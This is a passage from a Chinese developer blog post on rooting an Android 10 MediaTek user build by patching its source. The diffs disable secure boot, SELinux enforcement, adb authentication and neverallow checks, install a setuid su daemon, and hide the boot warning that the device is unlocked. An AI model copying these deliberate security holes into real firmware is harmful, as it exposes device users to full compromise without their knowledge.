id="1-让进程名称在-AS-Logcat-中可见，通过修改-ro-adb-secure-和-ro-secure"><a href="#1-让进程名称在-AS-Logcat-中可见，通过修改-ro-adb-secure-和-ro-secure" class="headerlink" title="1.让进程名称在 AS Logcat 中可见，通过修改 ro.adb.secure 和 ro.secure"></a>1.让进程名称在 AS Logcat 中可见，通过修改 ro.adb.secure 和 ro.secure</h4><p>ps：这步不是必须的，目的只是在 logcat 中可见进程 pid 和包名，而且打开 USB 调试时默认授权，不再弹授权框</p><p><strong>build/make/core/main.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> tags_to_install :=</span><br><span class="line"> ifneq (,$(user_variant))</span><br><span class="line">   <span class="comment"># Target is secure in user builds.</span></span><br><span class="line">-  ADDITIONAL_DEFAULT_PROPERTIES += ro.secure=1</span><br><span class="line">+  <span class="comment"># ADDITIONAL_DEFAULT_PROPERTIES += ro.secure=1</span></span><br><span class="line">+  ADDITIONAL_DEFAULT_PROPERTIES += ro.secure=0</span><br><span class="line">   ADDITIONAL_DEFAULT_PROPERTIES += security.perf_harden=1</span><br><span class="line"> </span><br><span class="line">   ifeq ($(user_variant),user)</span><br><span class="line">-    ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=1</span><br><span class="line">+    <span class="comment"># ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=1</span></span><br><span class="line">+    ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=0</span><br><span class="line">   endif</span><br><span class="line"> </span><br><span class="line">   ifeq ($(user_variant),userdebug)</span><br><span class="line">@@ -251,7 +253,7 @@ ifneq (,$(user_variant))</span><br><span class="line">     tags_to_install += debug</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="comment"># Disable debugging in plain user builds.</span></span><br><span class="line">-    enable_target_debugging :=</span><br><span class="line">+    <span class="comment"># enable_target_debugging :=</span></span><br><span class="line">   endif</span><br><span class="line"> </span><br><span class="line">   <span class="comment"># Disallow mock locations by default for user builds</span></span><br></pre></td></tr></table></figure><h4 id="2-修改-SELinux权限为-Permissive"><a href="#2-修改-SELinux权限为-Permissive" class="headerlink" title="2.修改 SELinux权限为 Permissive"></a>2.修改 SELinux权限为 Permissive</h4><p>SELinux 常用状态有两个 Permissive 和 Enforcing，通过 adb shell getenforce 可查看当前所处模式<br>10.0 改到了 selinux.cpp 中</p><p><strong>system/core/init/selinux.cpp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> bool <span class="function"><span class="title">IsEnforcing</span></span>() &#123;</span><br><span class="line">+    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">if</span> (ALLOW_PERMISSIVE_SELINUX) &#123;</span><br><span class="line">         <span class="built_in">return</span> StatusFromCmdline() == SELINUX_ENFORCING;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h4 id="3-关闭-DM-verity"><a href="#3-关闭-DM-verity" class="headerlink" title="3.关闭 DM-verity"></a>3.关闭 DM-verity</h4><p><strong>vendor/mediatek/proprietary/bootable/bootloader/preloader/custom/k62v1_64_bsp/k62v1_64_bsp.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> TARGET=k62v1_64_bsp</span><br><span class="line"> MTK_PLATFORM=MT6765</span><br><span class="line"> MTK_SEC_CHIP_SUPPORT=<span class="built_in">yes</span></span><br><span class="line">-MTK_SEC_USBDL=ATTR_SUSBDL_ONLY_ENABLE_ON_SCHIP</span><br><span class="line">-MTK_SEC_BOOT=ATTR_SBOOT_ENABLE</span><br><span class="line">+MTK_SEC_USBDL=ATTR_SUSBDL_DISABLE</span><br><span class="line">+MTK_SEC_BOOT=ATTR_SBOOT_DISABLE</span><br><span class="line"> MTK_SEC_MODEM_AUTH=no</span><br><span class="line"> MTK_SEC_SECRO_AC_SUPPORT=<span class="built_in">yes</span></span><br><span class="line"> <span class="comment"># Platform</span></span><br></pre></td></tr></table></figure><h4 id="4-增加-su-相关，确保-apk-root-权限"><a href="#4-增加-su-相关，确保-apk-root-权限" class="headerlink" title="4.增加 su 相关，确保 apk root 权限"></a>4.增加 su 相关，确保 apk root 权限</h4><p>apk 获取 root 权限，需要内置 su 文件，参考之前 8.1 的做法，在 init.rc 中 boot_completed 时执行脚本</p><p>开机执行脚本的命令可直接加在 <strong>system/core/rootdir/init.rc</strong></p><p>开机脚本执行是否成功，可通过 adb shell dmesg &gt; dmesg.txt 抓取 init 的日志，搜索是否报错，或者缺少权限。</p><p>boot_completed 启动完成时，start suproce</p><p><strong>system/core/rootdir/init.rc</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">     class_reset main</span><br><span class="line"> </span><br><span class="line">+service suproce  /system/bin/suproce.sh</span><br><span class="line">+    class main</span><br><span class="line">+    user root</span><br><span class="line">+    group root</span><br><span class="line">+    oneshot</span><br><span class="line">+    seclabel u:object_r:suproce_exec:s0</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line"> on property:sys.boot_completed=1</span><br><span class="line">+    start suproce</span><br><span class="line">     bootchart stop</span><br></pre></td></tr></table></figure><p><strong>system/extras/su/suproce.sh</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/system/bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mount -o rw,remount /system</span><br><span class="line"><span class="built_in">chmod</span> 06755 su</span><br><span class="line">su --daemon</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;su daemon done.&quot;</span></span><br></pre></td></tr></table></figure><p><strong>device/mediatek/sepolicy/basic/non_plat/file_contexts</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#hidl process merging</span></span><br><span class="line"> /(system\/vendor|vendor)/bin/hw/merged_hal_service          u:object_r:merged_hal_service_exec:s0</span><br><span class="line">+</span><br><span class="line">+<span class="comment">#suproce</span></span><br><span class="line">+/system/bin/suproce.sh          u:object_r:suproce_exec:s0</span><br></pre></td></tr></table></figure><p>此处写法有变动，suproce.te 中要加 system_file_type，不然编译时报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out/target/product/k62v1_64_bsp/obj/ETC/sepolicy_tests_intermediates/sepolicy_tests )<span class="string">&quot;</span></span><br><span class="line"><span class="string">The following types on /system/ must be associated with the &quot;</span>system_file_type<span class="string">&quot; attribute: suproce_exec</span></span><br><span class="line"><span class="string">checkpolicy:  error(s) encountered while parsing configuration</span></span><br></pre></td></tr></table></figure><p><strong>device/mediatek/sepolicy/basic/non_plat/suproce.te</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> suproce, coredomain;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#type suproce_exec, exec_type, vendor_file_type, file_type;</span></span><br><span class="line"><span class="built_in">type</span>  suproce_exec, exec_type, file_type, system_file_type;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># permissive suproce;</span></span><br><span class="line"><span class="comment"># allow shell suproce_exec:file &#123; read open getattr execute &#125;;</span></span><br><span class="line"> </span><br><span class="line">init_daemon_domain(suproce);</span><br></pre></td></tr></table></figure><p>改完后继续编译，再次出现新错误，user 版本不允许 permissive domains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ 19% 1135/5824] build out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy</span><br><span class="line">FAILED: out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy</span><br><span class="line">/bin/bash -c <span class="string">&quot;(ASAN_OPTIONS=detect_leaks=0 out/host/linux-x86/bin/checkpolicy -M -c 30 -o out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy.tmp out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy.recovery.conf ) &amp;&amp; (out/host/linux-x86/bin/sepolicy-analyze out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy.tmp permissive &gt; out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy.permissivedomains ) &amp;&amp; (if [ \&quot;user\&quot; = \&quot;user\&quot; -a -s out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy.permissivedomains ]; then echo \&quot;==========\&quot; 1&gt;&amp;2; echo \&quot;ERROR: permissive domains not allowed in user builds\&quot; 1&gt;&amp;2; echo \&quot;List of invalid domains:\&quot; 1&gt;&amp;2; cat out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy.permissivedomains 1&gt;&amp;2; exit 1; fi ) &amp;&amp; (mv out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy.tmp out/target/product/k62v1_64_bsp/obj/ETC/sepolicy.recovery_intermediates/sepolicy )&quot;</span></span><br><span class="line">device/mediatek/sepolicy/bsp/plat_private/untrusted_app_all.te:7:WARNING <span class="string">&#x27;unrecognized character&#x27;</span> at token <span class="string">&#x27;&#x27;</span> on line 53889:</span><br><span class="line"><span class="comment"># Purpose: Make app can get phoneEx</span></span><br></pre></td></tr></table></figure><p>注释下面文件中的 exit 1</p><p><strong>system/sepolicy/Android.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@@ -518,7 +518,7 @@ $(LOCAL_BUILT_MODULE): $(HOST_OUT_EXECUTABLES)/secilc $(HOST_OUT_EXECUTABLES)/se</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;ERROR: permissive domains not allowed in user builds&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;List of invalid domains:&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">                <span class="built_in">cat</span> <span class="variable">$@</span>.permissivedomains 1&gt;&amp;2; \</span><br><span class="line">-               <span class="built_in">exit</span> 1; \</span><br><span class="line">+               <span class="comment"># exit 1; \</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        $(hide) <span class="built_in">mv</span> <span class="variable">$@</span>.tmp <span class="variable">$@</span></span><br><span class="line"> </span><br><span class="line">@@ -562,7 +562,7 @@ $(LOCAL_BUILT_MODULE): $(sepolicy.recovery.conf) $(HOST_OUT_EXECUTABLES)/checkpo</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;ERROR: permissive domains not allowed in user builds&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;List of invalid domains:&quot;</span> 1&gt;&amp;2; \</span><br><span class="line">                <span class="built_in">cat</span> <span class="variable">$@</span>.permissivedomains 1&gt;&amp;2; \</span><br><span class="line">-               <span class="built_in">exit</span> 1; \</span><br><span class="line">+               <span class="comment"># exit 1; \</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        $(hide) <span class="built_in">mv</span> <span class="variable">$@</span>.tmp <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>再重新编译，又报错，卧底马，什么情况, 在 <strong>system/sepolicy/public/domain.te</strong> 中 335 行进行了权限检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">libsepol.report_assertion_extended_permissions: neverallowxperm on line 335 of system/sepolicy/public/domain.te (or line 11735 of policy.conf) violated by allow aee_aed suproce_exec:file &#123; ioctl &#125;;</span><br><span class="line">libsepol.report_assertion_extended_permissions: neverallowxperm on line 335 of system/sepolicy/public/domain.te (or line 11735 of policy.conf) violated by allow crash_dump suproce_exec:file &#123; ioctl &#125;;</span><br><span class="line">libsepol.check_assertions: 2 neverallow failures occurred</span><br><span class="line">Error <span class="keyword">while</span> expanding policy</span><br><span class="line"></span><br><span class="line">libsepol.report_assertion_extended_permissions: neverallowxperm on line 335 of system/sepolicy/public/domain.te (or line 11642 of policy.conf) violated by allow aee_aed suproce_exec:file &#123; ioctl &#125;;</span><br><span class="line">libsepol.report_assertion_extended_permissions: neverallowxperm on line 335 of system/sepolicy/public/domain.te (or line 11642 of policy.conf) violated by allow crash_dump suproce_exec:file &#123; ioctl &#125;;</span><br><span class="line">libsepol.check_assertions: 2 neverallow failures occurred</span><br><span class="line">Error <span class="keyword">while</span> expanding policy</span><br></pre></td></tr></table></figure><p><strong>system/sepolicy/public/domain.te</strong><br><strong>system/sepolicy/prebuilts/api/29.0/public/domain.te</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># All ioctls on file-like objects (except chr_file and blk_file) and</span></span><br><span class="line"><span class="comment"># sockets must be restricted to a whitelist.</span></span><br><span class="line"><span class="comment"># neverallowxperm * *:&#123; dir notdevfile_class_set socket_class_set blk_file &#125; ioctl &#123; 0 &#125;;</span></span><br></pre></td></tr></table></figure><p>直接将 neverallowxperm * *:{ dir notdevfile_class_set socket_class_set blk_file } ioctl { 0 }; 这行注释就行，不过需要两个文件都注释，</p><p>开始按照忽略原则将 aee_aed、crash_dump 通过 - 的方式修改，又报其它错误(宝宝心里苦啊)</p><p>*neverallowxperm { * -aee_aed -crash_dump } :{ dir notdevfile_class_set socket_class_set blk_file } ioctl { 0 }; 这样行不通</p><p>拷贝 su 文件和开机脚本 suproce.sh 到 system/bin 目录下<br><strong>device/mediateksample/k62v1_64_bsp/device.mk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@ -19,6 +19,11 @@ PRODUCT_COPY_FILES += $(LOCAL_PATH)/sbk-kpd.kl:system/usr/keylayout/sbk-kpd.kl:m</span><br><span class="line">                       $(LOCAL_PATH)/sbk-kpd.kcm:system/usr/keychars/sbk-kpd.kcm:mtk</span><br><span class="line"> endif</span><br><span class="line"> </span><br><span class="line">+PRODUCT_COPY_FILES += \</span><br><span class="line">+       system/extras/su/su:system/bin/su \</span><br><span class="line">+       system/extras/su/suproce.sh:system/bin/suproce.sh</span><br></pre></td></tr></table></figure><p>给 su 文件增加权限</p><p><strong>system/core/libcutils/fs_config.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-166</span>,<span class="number">7</span> +<span class="number">168</span>,<span class="number">9</span> @@ <span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_path_config</span> <span class="title">android_files</span>[] =</span> &#123;</span><br><span class="line">     <span class="comment">// the following two files are INTENTIONALLY set-uid, but they</span></span><br><span class="line">     <span class="comment">// are NOT included on user builds.</span></span><br><span class="line">     &#123; <span class="number">06755</span>, AID_ROOT,      AID_ROOT,      <span class="number">0</span>, <span class="string">&quot;system/xbin/procmem&quot;</span> &#125;,</span><br><span class="line">-    &#123; <span class="number">04750</span>, AID_ROOT,      AID_SHELL,     <span class="number">0</span>, <span class="string">&quot;system/xbin/su&quot;</span> &#125;,</span><br><span class="line">+    &#123; <span class="number">06755</span>, AID_ROOT,      AID_SHELL,     <span class="number">0</span>, <span class="string">&quot;system/bin/su&quot;</span> &#125;,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">     <span class="comment">// the following files have enhanced capabilities and ARE included</span></span><br><span class="line">     <span class="comment">// in user builds.</span></span><br></pre></td></tr></table></figure><h4 id="5-解锁-fastboot，并关闭-verity-按需操作"><a href="#5-解锁-fastboot，并关闭-verity-按需操作" class="headerlink" title="5.解锁 fastboot，并关闭 verity 按需操作"></a>5.解锁 fastboot，并关闭 verity 按需操作</h4><p><strong>system/core/adb/Android.bp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@@ -76,7 +76,15 @@ cc_defaults &#123;</span><br><span class="line">     name: <span class="string">&quot;adbd_defaults&quot;</span>,</span><br><span class="line">     defaults: [<span class="string">&quot;adb_defaults&quot;</span>],</span><br><span class="line"> </span><br><span class="line">-    cflags: [<span class="string">&quot;-UADB_HOST&quot;</span>, <span class="string">&quot;-DADB_HOST=0&quot;</span>],</span><br><span class="line">+    //cflags: [<span class="string">&quot;-UADB_HOST&quot;</span>, <span class="string">&quot;-DADB_HOST=0&quot;</span>],</span><br><span class="line">+    cflags: [</span><br><span class="line">+        <span class="string">&quot;-UADB_HOST&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-DADB_HOST=0&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-UALLOW_ADBD_ROOT&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-DALLOW_ADBD_ROOT=1&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-DALLOW_ADBD_DISABLE_VERITY&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;-DALLOW_ADBD_NO_AUTH&quot;</span>,</span><br><span class="line">+    ],</span><br><span class="line">     product_variables: &#123;</span><br><span class="line">         debuggable: &#123;</span><br><span class="line">             cflags: [</span><br></pre></td></tr></table></figure><p><strong>system/core/adb/daemon/main.cpp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@@ -63,12 +63,13 @@ static inline bool <span class="function"><span class="title">is_device_unlocked</span></span>() &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> static bool <span class="function"><span class="title">should_drop_capabilities_bounding_set</span></span>() &#123;</span><br><span class="line">-    <span class="keyword">if</span> (ALLOW_ADBD_ROOT || is_device_unlocked()) &#123;</span><br><span class="line">+    /*<span class="keyword">if</span> (ALLOW_ADBD_ROOT || is_device_unlocked()) &#123;</span><br><span class="line">         <span class="keyword">if</span> (__android_log_is_debuggable()) &#123;</span><br><span class="line">             <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">-    <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">+    <span class="built_in">return</span> <span class="literal">true</span>;*/</span><br><span class="line">+    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> static bool <span class="function"><span class="title">should_drop_privileges</span></span>() &#123;</span><br></pre></td></tr></table></figure><p>解锁时可能音量上键不生效，那需要进行对调</p><p><strong>vendor/mediatek/proprietary/bootable/bootloader/lk/app/mt_boot/sec_unlock.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        unlock_warranty();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">-               <span class="keyword">if</span> (mtk_detect_key(MT65XX_MENU_SELECT_KEY)) &#123; <span class="comment">//VOL_UP</span></span><br><span class="line">+               <span class="comment">//if (mtk_detect_key(MT65XX_MENU_SELECT_KEY)) &#123; //VOL_UP</span></span><br><span class="line">+               <span class="keyword">if</span> (mtk_detect_key(MT65XX_MENU_OK_KEY)) &#123; <span class="comment">//VOL_DOWN</span></span><br><span class="line">                        fastboot_info(<span class="string">&quot;Start unlock flow\n&quot;</span>);</span><br><span class="line">                        <span class="comment">//Invoke security check after confirming &quot;yes&quot; by user</span></span><br><span class="line">                        ret = fastboot_get_unlock_perm(&amp;unlock_allowed);</span><br><span class="line">@@ <span class="number">-374</span>,<span class="number">7</span> +<span class="number">375</span>,<span class="number">8</span> @@ <span class="type">void</span> <span class="title function_">fastboot_oem_unlock</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *arg, <span class="type">void</span> *data, <span class="type">unsigned</span> sz)</span></span><br><span class="line">                                <span class="title function_">fastboot_okay</span><span class="params">(<span class="string">&quot;&quot;</span>)</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">-               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mtk_detect_key(MT65XX_MENU_OK_KEY)) &#123; <span class="comment">//VOL_DOWN</span></span><br><span class="line">+               <span class="comment">//&#125; else if (mtk_detect_key(MT65XX_MENU_OK_KEY)) &#123; //VOL_DOWN</span></span><br><span class="line">+               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mtk_detect_key(MT65XX_MENU_SELECT_KEY)) &#123; <span class="comment">//VOL_UP</span></span><br><span class="line">                        video_printf(<span class="string">&quot;return to fastboot in 3s\n&quot;</span>);</span><br><span class="line">                        mdelay(<span class="number">3000</span>);</span><br><span class="line">                        fastboot_boot_menu();</span><br></pre></td></tr></table></figure><p>去除 oem 解锁后每次开机提示 <strong>Your device has been unlocked and can’t be trusted</strong> 警告字眼</p><p><strong>vendor/mediatek/proprietary/bootable/bootloader/lk/platform/common/boot/vboot_state.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-133</span>,<span class="number">9</span> +<span class="number">133</span>,<span class="number">10</span> @@ <span class="type">int</span> <span class="title function_">orange_state_warning</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"> </span><br><span class="line">        <span class="title function_">video_clean_screen</span><span class="params">()</span>;</span><br><span class="line">        video_set_cursor(video_get_rows() / <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">-       video_printf(title_msg);</span><br><span class="line">-       video_printf(<span class="string">&quot;Your device has been unlocked and can&#x27;t be trusted\n&quot;</span>);</span><br><span class="line">-       video_printf(<span class="string">&quot;Your device will boot in 5 seconds\n&quot;</span>);</span><br><span class="line">+       <span class="comment">//20191206  annotaion </span></span><br><span class="line">+       <span class="comment">// video_printf(title_msg);</span></span><br><span class="line">+       <span class="comment">// video_printf(&quot;Your device has been unlocked and can&#x27;t be trusted\n&quot;);</span></span><br><span class="line">+       <span class="comment">// video_printf(&quot;Your device will boot in 5 seconds\n&quot;);</span></span><br><span class="line">        mtk_wdt_restart();</span><br><span class="line">        mdelay(<span class="number">5000</span>);</span><br><span class="line">        mtk_wdt_restart();</span><br></pre></td></tr></table></figure><p>获取 adb root 权限, user 版本目前还不能 remount 成功， userdebug 版本可成功 remount，</p><p>后续 user 版本 adb 成功后会持续更新，以下是操作比对</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">=user==========</span><br><span class="line">C:&gt;adb root</span><br><span class="line"></span><br><span class="line">C:&gt;adb remount</span><br><span class="line">/system/bin/remount exited with status 2</span><br><span class="line">remount failed</span><br><span class="line"></span><br><span class="line">C:&gt;adb disable-verity</span><br><span class="line">Device is locked. Please unlock the device first</span><br><span class="line"></span><br><span class="line">C:&gt;adb reboot bootloader</span><br><span class="line"></span><br><span class="line">C:&gt;fastboot flashing unlock</span><br><span class="line">…</span><br><span class="line">(bootloader) Start unlock flow</span><br><span class="line"></span><br><span class="line">OKAY [ 12.394s]</span><br><span class="line">finished. total time: 12.398s</span><br><span class="line"></span><br><span class="line">C:&gt;fastboot reboot</span><br><span class="line">rebooting…</span><br><span class="line"></span><br><span class="line">finished. total time: 0.003s</span><br><span class="line"></span><br><span class="line">C:&gt;adb root</span><br><span class="line"></span><br><span class="line">C:&gt;adb disable-verity</span><br><span class="line">Successfully disabled verity</span><br><span class="line">Now reboot your device <span class="keyword">for</span> settings to take effect</span><br><span class="line"></span><br><span class="line">C:&gt;adb reboot</span><br><span class="line"></span><br><span class="line">C:&gt;adb root</span><br><span class="line"></span><br><span class="line">C:&gt;adb remount</span><br><span class="line">/system/bin/remount exited with status 2</span><br><span class="line">remount failed</span><br><span class="line"></span><br><span class="line">=userdebug==========</span><br><span 